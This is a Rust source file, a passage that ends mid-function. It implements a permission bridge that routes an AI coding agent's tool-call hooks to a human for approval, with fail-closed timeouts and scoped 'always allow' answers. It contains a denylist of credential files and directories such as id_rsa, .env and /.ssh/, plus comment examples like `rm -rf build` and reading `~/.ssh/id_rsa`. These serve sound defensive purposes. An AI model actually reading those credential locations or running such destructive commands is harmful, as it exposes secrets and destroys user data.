//! Permission bridge between `agy`'s `PreToolUse` hook and the ACP client.
//!
//! `agy` cannot prompt for tool permissions when it runs headless (`-p`), so the
//! adapter takes over gating entirely:
//!
//! ```text
//! agy (PreToolUse hook) --unix socket--> agy-acp --session/request_permission--> ACP client
//!                       <--allow/deny--         <--outcome--------------------
//! ```
//!
//! `agy` is spawned with its own permission checks disabled, so this bridge is the
//! only gate on tool execution. Anything it cannot resolve is denied.

use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{UnixListener, UnixStream};
use tokio::sync::{mpsc, oneshot, Mutex};
use uuid::Uuid;

/// Env var carrying the bridge socket path into the `agy` subprocess (and from
/// there into the hook command).
pub const SOCKET_ENV: &str = "AGY_ACP_PERMISSION_SOCKET";

/// Overrides how long a permission request waits for an answer, in seconds.
pub const TIMEOUT_ENV: &str = "AGY_ACP_PERMISSION_TIMEOUT_SECS";

/// How long to wait for a human before giving up and denying.
///
/// Three timeouts are stacked around a permission request and the order matters:
/// this one must expire first, then the hook's own `timeout`, then agy's
/// `--print-timeout`. Only the innermost produces a clean deny that the model can
/// carry on from; if either outer one fires first, agy aborts and the whole prompt
/// turn fails with an error instead.
const DEFAULT_RESPONSE_TIMEOUT: Duration = Duration::from_secs(540);

fn response_timeout() -> Duration {
    std::env::var(TIMEOUT_ENV)
        .ok()
        .and_then(|raw| raw.parse().ok())
        .map(Duration::from_secs)
        .unwrap_or(DEFAULT_RESPONSE_TIMEOUT)
}

/// Decision returned to `agy`'s `PreToolUse` hook.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Deny,
}

impl Decision {
    fn as_hook_json(self, reason: &str) -> Value {
        let decision = match self {
            Decision::Allow => "allow",
            Decision::Deny => "deny",
        };
        json!({ "decision": decision, "reason": reason })
    }
}

/// Remembered "always" answers, keyed by session, tool name, and — whenever the
/// checks that still run cannot constrain the arguments — a fingerprint of those
/// arguments.
///
/// In memory only: they are scoped to one session id and die with the process,
/// so a reloaded session in a fresh process asks again. A session's answers are
/// also dropped when that session is evicted.
///
/// The third element is the security argument for this key, and it is worth
/// stating plainly. The sticky key must be as specific as the checks that still
/// apply to a remembered allow. For a path-argument tool like `view_file`,
/// containment and the sensitive-path list do still constrain a remembered
/// allow, so the tool name is a defensible scope. Where they cannot, the key is
/// the *only* thing scoping the answer and it has to carry the arguments.
///
/// "Where they cannot" is wider than command tools, and reading it narrowly is
/// how the hole gets reopened. `escapes_containment` reads arguments as paths, so
/// it is inert against a command line (one opaque string the shell reinterprets)
/// *and* against a URL (not on the filesystem at all) *and* against whatever an
/// unrecognised tool does with arguments this fork has never seen. All three get
/// the fingerprint; see [`sticky_scope`], which grants `None` only to a tool that
/// has earned it. Without this, "always allow" on `echo hello` also allowed
/// `rm -rf build`, and "always allow" on one URL allowed every other.
type AlwaysKey = (String, String, Option<String>);

#[derive(Default)]
struct BridgeState {
    /// agy conversation id -> ACP session id.
    conversations: HashMap<String, String>,
    /// Session whose prompt is currently running. The adapter serializes prompts,
    /// so this identifies the owner of any hook call whose conversation id has not
    /// been observed yet — which is the common case for the first tool call of a
    /// brand new conversation.
    active_session: Option<String>,
    /// In-flight `session/request_permission` calls, keyed by JSON-RPC id.
    ///
    /// The session is kept alongside the sender so that cancelling a turn can
    /// find that turn's requests. Without it a cancelled request keeps waiting
    /// for its full timeout, which then lands in whatever turn is running by
    /// then -- see [`PermissionBridge::abandon_pending`].
    pending: HashMap<String, PendingRequest>,
    /// Sticky answers from "always" options.
    always: HashMap<AlwaysKey, Decision>,
    /// The adapter's private hook directory, refused on sight. See [`targets_hook_root`].
    hook_root: Option<PathBuf>,
    /// Directories a read may touch without asking.
    workspace_roots: Vec<PathBuf>,
    /// What may be approved without asking. Empty by default, so tests and any
    /// path that forgets to set it prompt for everything.
    policy: AutoAllowPolicy,
    /// Whether the *user* refused a tool call during the running prompt: they
    /// picked a reject option, dismissed the request, or were asked and did not
    /// answer. agy reports a refusal as a failed turn, indistinguishable from a
    /// real provider failure by the time the adapter sees it, and this is how the
    /// two are told apart. Cleared when a prompt starts.
    ///
    /// Deliberately not set by the bridge's own fail-closed denials — no session
    /// to ask, client gone, the adapter's hook directory. Those are policy, and
    /// treating them as a refusal would let one hide a genuine provider failure
    /// later in the same turn.
    refused_during_prompt: bool,
    /// Counts turns, so an answer can be matched to the turn that asked for it.
    ///
    /// A permission decision is applied by the hook task, which may not be polled
    /// again until well after the turn ended -- a host answer resolves the oneshot
    /// but the task that acts on it runs whenever the runtime gets to it. Without
    /// this, that late work lands in whichever turn is running by then, or in the
    /// gap before one starts. Bumped at both edges of a turn, so "the turn that
    /// asked is still running" is the only state that counts. See
    /// [`PermissionBridge::mark_user_refusal`].
    turn_generation: u64,
}

/// A `session/request_permission` the host has not answered yet.
struct PendingRequest {
    session_id: String,
    answer: oneshot::Sender<Answer>,
}

/// How a pending permission request ended.
enum Answer {
    /// The host replied. The value is its `result`.
    Host(Value),
    /// The turn that asked has ended, so nobody is going to answer this.
    Abandoned,
}

/// Shared handle to the permission bridge.
#[derive(Clone)]
pub struct PermissionBridge {
    state: Arc<Mutex<BridgeState>>,
    out_tx: mpsc::UnboundedSender<Option<String>>,
    socket_path: Arc<PathBuf>,
}

impl PermissionBridge {
    /// Binds the bridge socket and starts accepting hook connections.
    pub fn start(out_tx: mpsc::UnboundedSender<Option<String>>) -> std::io::Result<Self> {
        let socket_path = default_socket_path();
        if let Some(parent) = socket_path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        // A socket from a previous run would refuse to bind.
        let _ = std::fs::remove_file(&socket_path);

        let listener = UnixListener::bind(&socket_path)?;
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState {
                policy: AutoAllowPolicy::from_env(),
                ..BridgeState::default()
            })),
            out_tx,
            socket_path: Arc::new(socket_path),
        };

        let accept_bridge = bridge.clone();
        tokio::spawn(async move {
            while let Ok((stream, _)) = listener.accept().await {
                let bridge = accept_bridge.clone();
                tokio::spawn(async move { bridge.serve_hook(stream).await });
            }
        });

        Ok(bridge)
    }

    pub fn socket_path(&self) -> &Path {
        self.socket_path.as_path()
    }

    /// Associates an agy conversation with the ACP session that owns it, so hook
    /// payloads can be routed to the right session.
    pub async fn register_conversation(&self, conversation_id: &str, session_id: &str) {
        let mut state = self.state.lock().await;
        state
            .conversations
            .insert(conversation_id.to_string(), session_id.to_string());
    }

    /// Tells the bridge which directory holds its own hook, so tool calls aimed at
    /// it can be refused without troubling the user.
    pub async fn set_hook_root(&self, hook_root: &Path) {
        let mut state = self.state.lock().await;
        state.hook_root = Some(hook_root.to_path_buf());
    }

    /// Records the workspace a read may stay within without needing approval.
    pub async fn set_workspace_root(&self, workspace_root: &str) {
        let root = PathBuf::from(workspace_root);
        let mut state = self.state.lock().await;
        if !state.workspace_roots.contains(&root) {
            state.workspace_roots.push(root);
        }
    }

    /// Marks the session whose prompt is running, for the duration of that prompt.
    /// Starting a prompt also clears the denial flag from the previous one.
    pub async fn set_active_session(&self, session_id: Option<&str>) {
        let mut state = self.state.lock().await;
        state.active_session = session_id.map(str::to_string);
        // The turn ends here, so nothing that was still deciding for it counts
        // from here on. Bumping on the way out as well as on the way in matters:
        // between one turn's teardown and the next turn's start there is no turn
        // running, and a decision applied in that gap would otherwise still match
        // the generation of the turn that just finished -- long enough to leave a
        // sticky "always" behind, which nothing later clears.
        state.turn_generation = state.turn_generation.wrapping_add(1);
        if state.active_session.is_none() {
            return;
        }
        state.refused_during_prompt = false;
        // Every pending request belongs to a turn that is over, whatever session
        // asked it: `handle_session_prompt` runs under the adapter mutex, so one
        // turn runs at a time across the whole adapter, and this line is inside
        // the turn that just took that lock. Nothing else can have a request in
        // flight right now.
        //
        // That serialization is the load-bearing premise, and it is a property of
        // `main.rs`, not of this module -- `CancelRegistry` already turns on the
        // same fact ("the adapter mutex serializes execution", `cancel.rs`). If
        // turns are ever allowed to run concurrently, this drain has to go back
        // to filtering by session, and the session-scoped hole it leaves has to
        // be closed some other way, because the flag below is adapter-wide.
        //
        // Draining all of them, rather than only this session's, is the point.
        // `refused_during_prompt` is one flag for the adapter, not one per
        // session, so a request left behind by session A times out into
        // whichever turn is running 540 seconds later -- session B's. Filtering
        // by session here would leave exactly that case uncovered.
        //
        // Clearing here as well as at teardown is deliberate: teardown is a call
        // a future edit could drop, and this is the one place every turn must
        // pass through, so a stale request cannot reach the flag this line just
        // reset.
        let stale: Vec<String> = state.pending.keys().cloned().collect();
        for id in &stale {
            if let Some(request) = state.pending.remove(id) {
                let _ = request.answer.send(Answer::Abandoned);
            }
        }
    }

    /// Whether the user refused a tool call during the prompt that just ran.
    pub async fn refused_during_prompt(&self) -> bool {
        self.state.lock().await.refused_during_prompt
    }

    /// Records that the user refused a tool call, but only for the turn that
    /// asked. `refused_during_prompt` is one flag for the adapter, and the turn
    /// reads it at teardown, so a mark applied after that read is not merely
    /// useless -- it is read by the *next* turn, which reports `stopReason:
    /// "refusal"` having never asked anyone anything. Comparing generations
    /// drops the mark instead of misfiling it.
    async fn mark_user_refusal(&self, turn: u64) {
        let mut state = self.state.lock().await;
        if state.turn_generation == turn {
            state.refused_during_prompt = true;
        }
    }

    /// Answers every outstanding permission request for a session whose turn has
    /// ended, so that none of them outlives the turn that asked.
    ///
    /// Without this the request sits in `pending` until its 540 second timeout,
    /// and that timeout marks a refusal — landing in whatever turn happens to be
    /// running by then and reporting it as `stopReason: "refusal"` when nobody
    /// refused anything. Returns how many were cleared.
    ///
    /// Called on cancellation *and* at the end of every turn. Cancellation is the
    /// obvious case, but not the only one: a turn that ends because agy died or
    /// its output became unreadable leaves the same request behind, with the same
    /// consequence, and nothing else would ever clear it.
    ///
    /// The host is not told to withdraw its prompt: ACP has no way to retract a
    /// request, and a host that follows the spec dismisses its own prompts when
    /// it cancels. A late answer to one of these is dropped, because the id is no
    /// longer in `pending`.
    pub async fn abandon_pending(&self, session_id: &str) -> usize {
        let mut state = self.state.lock().await;
        let ids: Vec<String> = state
            .pending
            .iter()
            .filter(|(_, request)| request.session_id == session_id)
            .map(|(id, _)| id.clone())
            .collect();
        for id in &ids {
            if let Some(request) = state.pending.remove(id) {
                let _ = request.answer.send(Answer::Abandoned);
            }
        }
        ids.len()
    }

    /// Registers a request to be answered, unless its turn ended while the
    /// caller was deciding whether to ask at all. Returns whether it was
    /// registered.
    ///
    /// The generation is the whole check. It moves at both edges of a turn, so
    /// "unchanged" means the turn that decided to ask is still the turn running
    /// -- a stronger statement than comparing the active session, which would
    /// also hold for a later turn of that same session.
    async fn register_pending(
        &self,
        request_id: &str,
        session_id: &str,
        turn: u64,
        answer: oneshot::Sender<Answer>,
    ) -> bool {
        let mut state = self.state.lock().await;
        if state.turn_generation != turn {
            return false;
        }
        state.pending.insert(
            request_id.to_string(),
            PendingRequest {
                session_id: session_id.to_string(),
                answer,
            },
        );
        true
    }

    /// Forgets a session's remembered answers, so "this session" means as long as
    /// the session is live rather than as long as the process is.
    ///
    /// Called when a session is evicted. A session restored from `sessions.json`
    /// afterwards is asked again, which is the safe direction: it also drops
    /// remembered *denies*, so the user is prompted rather than auto-denied.
    ///
    /// Deliberately leaves `active_session` and `pending` alone. A pending request
    /// belongs to a turn that is still running and its oneshot must resolve;
    /// eviction says nothing about that.
    pub async fn forget_session(&self, session_id: &str) {
        let mut state = self.state.lock().await;
        state.always.retain(|(sid, _, _), _| sid != session_id);
        // Dropped too, or a dead conversation id keeps resolving to a session
        // that no longer exists.
        state.conversations.retain(|_, sid| sid != session_id);
    }

    /// Routes an incoming JSON-RPC response back to the waiting hook. Returns
    /// `true` if the id belonged to this bridge.
    pub async fn resolve_response(&self, id: &Value, result: Option<Value>) -> bool {
        let Some(key) = id.as_str() else {
            return false;
        };
        if !key.starts_with(REQUEST_ID_PREFIX) {
            return false;
        }
        let mut state = self.state.lock().await;
        if let Some(request) = state.pending.remove(key) {
            let _ = request
                .answer
                .send(Answer::Host(result.unwrap_or_else(|| json!({}))));
        }
        true
    }

    /// Handles one hook invocation: read the payload, ask the user, write the decision.
    async fn serve_hook(&self, stream: UnixStream) {
        let (read_half, mut write_half) = stream.into_split();
        let mut lines = BufReader::new(read_half).lines();

        let payload = match lines.next_line().await {
            Ok(Some(line)) => serde_json::from_str::<Value>(&line).unwrap_or_else(|_| json!({})),
            _ => return,
        };

        let (decision, reason) = self.decide(&payload).await;
        let response = decision.as_hook_json(&reason).to_string();
        let _ = write_half.write_all(response.as_bytes()).await;
        let _ = write_half.write_all(b"\n").await;
        let _ = write_half.flush().await;
    }

    async fn decide(&self, payload: &Value) -> (Decision, String) {
        let tool_call = payload
            .get("toolCall")
            .cloned()
            .unwrap_or_else(|| json!({}));
        let tool_name = tool_call
            .get("name")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string();
        let args = tool_call.get("args").cloned().unwrap_or_else(|| json!({}));

        let conversation_id = payload
            .get("conversationId")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        // Resolved and checked together, before any path that can decide: a stale
        // hook must not be waved through by the auto-allow policy either, which
        // it was when this check sat further down.
        let (session_id, turn) = {
            let state = self.state.lock().await;
            let session_id = match state
                .conversations
                .get(conversation_id)
                .or(state.active_session.as_ref())
            {
                Some(id) => id.clone(),
                // No session to ask means nobody can approve, and agy's own gate is
                // off. Fail closed.
                None => {
                    return (
                        Decision::Deny,
                        "agy-acp: no ACP session to ask for permission".to_string(),
                    )
                }
            };
            // Nothing may be decided on behalf of a turn that is not the one
            // running. A hook task is not polled on any schedule of ours: it can
            // first reach this line after its own turn has torn down, or after the
            // next turn has started.
            if state.active_session.as_deref() != Some(session_id.as_str()) {
                return (
                    Decision::Deny,
                    "agy-acp: the turn ended before this was asked".to_string(),
                );
            }
            (session_id, state.turn_generation)
        };

        // The hook lives in a directory agy is given as a workspace root, so the model
        // can see it and will occasionally try to work in it — most often after a
        // refusal, when it goes looking for somewhere else to write. Nothing there is
        // the user's, and it is deleted when the adapter exits, so refuse without
        // asking rather than putting a meaningless prompt in front of them.
        if let Some(hook_root) = self.state.lock().await.hook_root.clone() {
            if targets_hook_root(&args, &hook_root) {
                return (
                    Decision::Deny,
                    "agy-acp: that path is the adapter's internal directory, not part \
                     of the workspace. Use the workspace directory instead."
                        .to_string(),
                );
            }
        }

        if let Some(reason) = self.auto_allow_reason(&tool_name, &args).await {
            return (Decision::Allow, reason);
        }

        let scope = sticky_scope(&tool_name, &args);
        let always_scope = AlwaysScope::of(scope.as_ref(), &args);
        let always_key = (session_id.clone(), tool_name.clone(), scope.clone());
        // Copied out before the branch: the body awaits the same mutex, and an
        // `if let` scrutinee guard would still be held inside it.
        let remembered = { self.state.lock().await.always.get(&always_key).copied() };
        if let Some(decision) = remembered {
            // A remembered deny applies immediately and unchanged.
            if decision == Decision::Deny {
                self.mark_user_refusal(turn).await;
                return (
                    Decision::Deny,
                    match always_scope.noun() {
                        Some(noun) => format!("Always rejected {noun} in this session."),
                        None => format!("Always rejected `{tool_name}` in this session."),
                    },
                );
            }
            // A remembered allow is only honoured for calls the bridge itself would
            // wave through. One that leaves the workspace or names something
            // sensitive still goes to the user — the original allow never covered
            // that, so it must not become a permanent bypass.
            if !self.escapes_containment(&args).await {
                return (
                    Decision::Allow,
                    match always_scope.noun() {
                        Some(noun) => format!("Always allowed {noun} in this session."),
                        None => format!("Always allowed `{tool_name}` in this session."),
                    },
                );
            }
        }

        let request_id = format!("{REQUEST_ID_PREFIX}{}", Uuid::new_v4());
        let (tx, rx) = oneshot::channel();
        // Checking the turn above and registering here are two lock acquisitions
        // with `escapes_containment` awaiting in between, so the turn can end in
        // the gap -- and teardown's drain would run before this entry exists to
        // be drained. Registering revalidates rather than assuming the check
        // still holds, which is what makes the pair atomic in the only sense that
        // matters: the entry is never created for a turn that is over.
        if !self.register_pending(&request_id, &session_id, turn, tx).await {
            return (
                Decision::Deny,
                "agy-acp: the turn ended before this was asked".to_string(),
            );
        }

        let request = json!({
            "jsonrpc": "2.0",
            "id": request_id,
            "method": "session/request_permission",
            "params": {
                "sessionId": session_id,
                "toolCall": {
                    "toolCallId": format!("{conversation_id}:{}", step_idx(payload)),
                    "title": tool_title(&tool_name, &args),
                    "kind": tool_kind(&tool_name),
                    "rawInput": args,
                },
                "options": permission_options(&tool_name, always_scope),
            },
        });

        if self.out_tx.send(Some(request.to_string())).is_err() {
            self.state.lock().await.pending.remove(&request_id);
            return (
                Decision::Deny,
                "agy-acp: client connection closed".to_string(),
            );
        }

        let outcome = match tokio::time::timeout(response_timeout(), rx).await {
            Ok(Ok(Answer::Host(value))) => value,
            // The turn this belonged to is over. Deny, because agy must not run
            // the tool, but this is not a refusal: nobody declined anything, and
            // the turn reports its own ending -- cancelled, or failed -- already.
            Ok(Ok(Answer::Abandoned)) => {
                return (
                    Decision::Deny,
                    "agy-acp: the turn ended before this was answered".to_string(),
                );
            }
            _ => {
                self.state.lock().await.pending.remove(&request_id);
                self.mark_user_refusal(turn).await;
                return (
                    Decision::Deny,
                    "agy-acp: timed out waiting for a permission decision".to_string(),
                );
            }
        };

        self.apply_outcome(&outcome, always_key, &tool_name, always_scope, turn)
            .await
    }

    /// True when `args` leaves the workspace or names something sensitive — the
    /// two conditions that, whatever the policy, still require a prompt.
    async fn escapes_containment(&self, args: &Value) -> bool {
        let (policy, workspace_roots) = {
            let state = self.state.lock().await;
            (state.policy.clone(), state.workspace_roots.clone())
        };
        outside_workspace(args, &workspace_roots).is_some()
            || string_args(args).iter().any(|arg| policy.is_sensitive(arg))
    }

    /// Decides whether a tool call is dull enough to approve without asking,
    /// returning the reason it was waved through.
    ///
    /// Two things keep this narrow. Reading is only harmless when it stays inside
    /// the workspace — `view_file` will otherwise happily read `~/.ssh/id_rsa`, and
    /// agy's own gate is off — so anything naming a path outside is still asked
    /// about. And tools that reach the network are excluded even though they only
    /// read: a URL is an exfiltration channel, not just a fetch.
    async fn auto_allow_reason(&self, tool_name: &str, args: &Value) -> Option<String> {
        let policy = {
            let state = self.state.lock().await;
            state.policy.clone()
        };

        if !policy.allows(tool_name) {
            return None;
        }
        // Anything leaving the workspace or looking sensitive needs a prompt even
        // when the tool itself would be auto-allowed.
        if self.escapes_containment(args).await {
            return None;
        }

        Some(format!(
            "Auto-allowed: `{tool_name}` cannot modify anything."
        ))
    }

    async fn apply_outcome(
        &self,
        outcome: &Value,
        always_key: AlwaysKey,
        tool_name: &str,
        scope: AlwaysScope,
        turn: u64,
    ) -> (Decision, String) {
        let outcome = outcome.get("outcome").unwrap_or(outcome);
        let kind = outcome
            .get("outcome")
            .and_then(|v| v.as_str())
            .unwrap_or("cancelled");
        if kind != "selected" {
            self.mark_user_refusal(turn).await;
            return (
                Decision::Deny,
                "Permission request was cancelled.".to_string(),
            );
        }

        let option_id = outcome
            .get("optionId")
            .and_then(|v| v.as_str())
            .unwrap_or(OPTION_REJECT_ONCE);
        // The scope is the same value the label was worded from, so the reason
        // agy sees cannot describe a breadth the user was not offered. Assert the
        // key agrees, since these are the two things that must never diverge.
        debug_assert_eq!(
            always_key.2.is_some(),
            scope != AlwaysScope::Tool,
            "the label's scope and the key's scope disagree"
        );

        let (decision, sticky, reason) = match option_id {
            OPTION_ALLOW_ONCE => (Decision::Allow, false, "Approved by user.".to_string()),
            OPTION_ALLOW_ALWAYS => (
                Decision::Allow,
                true,
                match scope.noun() {
                    Some(noun) => {
                        format!("Approved by user; always allowing {noun} in this session.")
                    }
                    None => {
                        format!("Approved by user; always allowing `{tool_name}` in this session.")
                    }
                },
            ),
            OPTION_REJECT_ALWAYS => (
                Decision::Deny,
                true,
                match scope.noun() {
                    Some(noun) => {
                        format!("Declined by user; always rejecting {noun} in this session.")
                    }
                    None => {
                        format!("Declined by user; always rejecting `{tool_name}` in this session.")
                    }
                },
            ),
            _ => (Decision::Deny, false, "Declined by user.".to_string()),
        };

        if decision == Decision::Deny {
            self.mark_user_refusal(turn).await;
        }

        // Sticky answers are gated on the turn too. An "always" clicked on a
        // prompt whose turn has since ended must not quietly configure the
        // sessions that follow it -- the same rule a late answer already gets
        // when `abandon_pending` won the race for the pending entry, applied
        // whichever side won.
        if sticky {
            let mut state = self.state.lock().await;
            if state.turn_generation == turn {
                state.always.insert(always_key, decision);
            }
        }
        (decision, reason)
    }
}

impl Drop for PermissionBridge {
    fn drop(&mut self) {
        // Only the last handle should unlink the socket.
        if Arc::strong_count(&self.socket_path) == 1 {
            let _ = std::fs::remove_file(self.socket_path.as_path());
        }
    }
}

const REQUEST_ID_PREFIX: &str = "agyacp-perm-";
const OPTION_ALLOW_ONCE: &str = "allow_once";
const OPTION_ALLOW_ALWAYS: &str = "allow_always";
const OPTION_REJECT_ONCE: &str = "reject_once";
const OPTION_REJECT_ALWAYS: &str = "reject_always";

/// What the two "always" labels claim the answer covers.
///
/// Derived once, in `decide`, from the same `sticky_scope` result that builds the
/// key, and then handed to both the prompt and [`PermissionBridge::apply_outcome`]
/// -- so the button, the stored key and the reason string cannot disagree about
/// scope. They were previously derived independently in those three places, with
/// nothing tying them together, and the label drifted from the key.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum AlwaysScope {
    /// Every later call to this tool, for this session. What the answer covers
    /// when `sticky_scope` returns `None`.
    Tool,
    /// This exact command line and no other. The prompt's title is already
    /// ``Run `{command}` `` (see [`tool_title`]), so "this exact command" refers
    /// to something shown directly above the buttons.
    Command,
    /// This exact call -- same tool, same arguments. The answer is keyed by the
    /// arguments, but the arguments are not a command, so calling it one would be
    /// a lie: `read_url_content` and `search_web` land here, as does every tool
    /// this fork does not know. Nothing above the buttons reads as a command, and
    /// a label must describe what is actually being consented to.
    Call,
}

impl AlwaysScope {
    /// `scope` is the `sticky_scope` result the key is built from; `args` decides
    /// only the wording, never the breadth.
    fn of(scope: Option<&String>, args: &Value) -> Self {
        match scope {
            None => AlwaysScope::Tool,
            Some(_) if has_command_line(args) => AlwaysScope::Command,
            Some(_) => AlwaysScope::Call,
        }
    }

    /// The noun the labels and reasons agree on. `None` for [`AlwaysScope::Tool`],
    /// which names the tool instead.
    fn noun(self) -> Option<&'static str> {
        match self {
            AlwaysScope::Tool => None,
            AlwaysScope::Command => Some("this exact command"),
            AlwaysScope::Call => Some("this exact call"),
        }
    }
}

/// The four answers offered with every prompt.
///
/// `kind` is the ACP enum the host styles on; `name` is free display text and is
/// ours to word. The "always" labels say "this session" because that is the outer
/// bound on every remembered answer, and name the scope inside it -- the tool, or
/// the one command or call in front of the user. The prompt is where someone
/// decides, not the README.
///
/// The scope arrives as an [`AlwaysScope`], not as the command text: nothing in
/// the label needs the string, and passing it would invite someone to interpolate
/// it.
fn permission_options(tool_name: &str, scope: AlwaysScope) -> Value {
    let (allow_always, reject_always) = match scope.noun() {
        Some(noun) => (
            format!("Always allow {noun} this session"),
            format!("Always reject {noun} this session"),
        ),
        None => (
            format!("Always allow {tool_name} this session"),
            format!("Always reject {tool_name} this session"),
        ),
    };
    json!([
        { "optionId": OPTION_ALLOW_ONCE, "name": "Allow once", "kind": "allow_once" },
        {
            "optionId": OPTION_ALLOW_ALWAYS,
            "name": allow_always,
            "kind": "allow_always",
        },
        { "optionId": OPTION_REJECT_ONCE, "name": "Reject", "kind": "reject_once" },
        {
            "optionId": OPTION_REJECT_ALWAYS,
            "name": reject_always,
            "kind": "reject_always",
        },
    ])
}

/// Comma-separated list of what may run without asking. Accepts tool names and
/// the groups `reads`, `searches` and `none`. Defaults to [`DEFAULT_AUTO_ALLOW`].
pub const AUTO_ALLOW_ENV: &str = "AGY_ACP_AUTO_ALLOW";

/// Comma-separated extra substrings marking a path as too sensitive to read
/// without asking. Added to [`SENSITIVE_PATTERNS`].
pub const SENSITIVE_ENV: &str = "AGY_ACP_SENSITIVE_PATTERNS";

/// Only the model asking the user a question is waved through by default.
///
/// Reading is not gated because it is safe — it is gated because agy's own checks
/// are off, so a read the user never sees is a read of anything on disk. Opt in
/// with `AGY_ACP_AUTO_ALLOW=reads,searches` when that trade is worth it.
const DEFAULT_AUTO_ALLOW: &str = "ask_question";

/// Tools that only read local files.
const READ_TOOLS: &[&str] = &["view_file", "view_code_item", "list_dir"];

/// Tools that only search local files.
const SEARCH_TOOLS: &[&str] = &["grep_search", "codebase_search", "find_by_name"];

/// Substrings that make a path worth a prompt even when reads are auto-allowed.
///
/// A denylist can never be complete — this is a second line, not the defence. The
/// defence is that reads are not auto-allowed unless asked for. Matching is on the
/// lowercased path and deliberately broad: `tokenizer.py` trips the `token` rule
/// and costs one prompt, which is the right way to be wrong.
const SENSITIVE_PATTERNS: &[&str] = &[
    // Environment and secret files.
    ".env",
    "token",
    "secret",
    "password",
    "passwd",
    "credential",
    "api_key",
    "apikey",
    // Keys and certificates.
    ".pem",
    ".key",
    ".p12",
    ".pfx",
    ".keystore",
    ".jks",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    // Tool credential files.
    ".netrc",
    ".npmrc",
    ".pypirc",
    ".git-credentials",
    ".htpasswd",
    // Credential directories.
    "/.ssh/",
    "/.aws/",
    "/.gnupg/",
    "/.kube/",
    "/.docker/config",
];

/// What the bridge may approve without asking the user.
#[derive(Clone, Debug, Default)]
pub struct AutoAllowPolicy {
    tools: Vec<String>,
    extra_sensitive: Vec<String>,
}

impl AutoAllowPolicy {
    /// Reads the policy from the environment, falling back to [`DEFAULT_AUTO_ALLOW`].
    pub fn from_env() -> Self {
        let raw = std::env::var(AUTO_ALLOW_ENV)
            .ok()
            .filter(|v| !v.trim().is_empty())
            .unwrap_or_else(|| DEFAULT_AUTO_ALLOW.to_string());

        let mut tools: Vec<String> = Vec::new();
        for entry in raw.split(',').map(str::trim).filter(|e| !e.is_empty()) {
            match entry {
                "none" => return AutoAllowPolicy::default(),
                "reads" => tools.extend(READ_TOOLS.iter().map(|t| t.to_string())),
                "searches" => tools.extend(SEARCH_TOOLS.iter().map(|t| t.to_string())),
                tool => tools.push(tool.to_string()),
            }
        }

        let extra_sensitive = std::env::var(SENSITIVE_ENV)
            .unwrap_or_default()
            .split(',')
            .map(|p| p.trim().to_lowercase())
            .filter(|p| !p.is_empty())
            .collect();

        AutoAllowPolicy {
            tools,
            extra_sensitive,
        }
    }

    /// Builds a policy directly, for tests.
    #[cfg(test)]
    pub fn with_tools(tools: &[&str]) -> Self {
        AutoAllowPolicy {
            tools: tools.iter().map(|t| t.to_string()).collect(),
            extra_sensitive: Vec::new(),
        }
    }

    fn allows(&self, tool: &str) -> bool {
        self.tools.iter().any(|t| t == tool)
    }

    /// True if the path looks like it holds credentials.
    fn is_sensitive(&self, path: &str) -> bool {
        let lowered = path.to_lowercase();
        SENSITIVE_PATTERNS
            .iter()
            .any(|pattern| lowered.contains(pattern))
            || self
                .extra_sensitive
                .iter()
                .any(|pattern| lowered.contains(pattern))
    }
}

/// Returns the first argument path in `args` that falls outside every root.
///
/// Two classes of argument are not absolute but still must be contained here, not
/// in `absolute_paths`: a `~`-prefixed string is always outside the workspace
/// (home-relative), and a string carrying a `..` component escapes unless it
/// resolves lexically inside a root. Plain strings like a search query are left
/// alone — only `/`-, `~`-prefixed, and `..`-bearing arguments are treated as paths.
///
/// Paths are compared after resolving symlinks where possible, since macOS reports
/// `/tmp/x` to agy but `/private/tmp/x` to the permission layer.
fn outside_workspace(args: &Value, roots: &[PathBuf]) -> Option<String> {
    let absolute = absolute_paths(args);

    if roots.is_empty() {
        // Without a known workspace nothing can be judged inside it, and that has
        // to cover all three shapes: `~/.ssh/id_rsa` is no more contained for the
        // roots being unset than it is with them set.
        return absolute
            .into_iter()
            .next()
            .or_else(|| path_field_args(args).into_iter().next())
            .or_else(|| {
                string_args(args)
                    .into_iter()
                    .find(|s| s.starts_with('~') || has_parent_component(s))
            });
    }

    // Absolute paths that escape are the common case.
    if let Some(escaped) = absolute
        .iter()
        .find(|path| !roots.iter().any(|root| is_inside(path, root)))
    {
        return Some(escaped.clone());
    }

    // A field that names a path names one whatever its value looks like, so a
    // plain relative value is judged too: `link/secret.txt` carries no `/`, `~`
    // or `..` and can still leave the workspace through a symlink.
    if let Some(escaped) = path_field_args(args)
        .into_iter()
        .find(|path| !roots.iter().any(|root| is_inside_from(path, root)))
    {
        return Some(escaped);
    }

    // `~` is home-relative and therefore never inside the workspace.
    let home_relative = string_args(args).into_iter().find(|s| s.starts_with('~'));
    if home_relative.is_some() {
        return home_relative;
    }

    // A `..` component can escape, and does so through symlinks as well as
    // textually, so this goes through the same resolving check as an absolute
    // path rather than trusting normalization.
    string_args(args)
        .into_iter()
        .filter(|s| has_parent_component(s))
        .find(|s| !roots.iter().any(|root| is_inside_from(s, root)))
}

/// True if `path` has a `..` component, rather than merely the two characters
/// somewhere in it: `sub/../x` is a traversal, `foo..bar` is an ordinary name.
fn has_parent_component(path: &str) -> bool {
    path.split('/').any(|component| component == "..")
}

/// True if `path` is inside `root`, taking a relative path as relative to it.
///
/// The adapter runs with the workspace as its working directory, so that is what
/// a relative argument is relative to: `sub/../file.txt` stays inside, `../secret`
/// does not.
fn is_inside_from(path: &str, root: &Path) -> bool {
    if path.starts_with('/') {
        return is_inside(path, root);
    }
    let root_norm = lexical_normalize(&root.display().to_string());
    is_inside(&format!("{root_norm}/{path}"), root)
}

/// Resolves `.` and `..` components textually without touching the filesystem.
fn lexical_normalize(path: &str) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                if matches!(parts.last(), Some(&"..")) || parts.is_empty() {
                    parts.push("..");
                } else {
                    parts.pop();
                }
            }
            other => parts.push(other),
        }
    }
